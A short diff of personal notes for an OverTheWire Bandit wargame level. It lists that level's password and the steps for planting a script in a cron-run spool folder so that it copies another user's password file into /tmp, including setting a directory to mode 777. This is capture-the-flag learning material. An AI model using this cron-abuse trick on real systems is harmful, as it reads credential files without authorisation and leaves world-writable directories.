@@ -1,1 +1,14 @@
-jc1udXuA1tiHqjIsL8yaapX5XIAI6i0n 
+jc1udXuA1tiHqjIsL8yaapX5XIAI6i0n
+
+- cronjob executes all scripts in /var/spool/bandit24 so copy a shell script into that folder that will
+  cat out the details of bandit_pass/bandit24
+- mkdir in /tmp
+- nano [script name]
+- Basic shell script format:
+-------------------------------------------------------
+#!/bin/bash
+
+cat /etc/bandit_pass/bandit24 > /tmp/eddy/password.txt
+-------------------------------------------------------
+- chmod +x [script name] to make it executable
+- chmod 777 . to grant all permissions to directory above
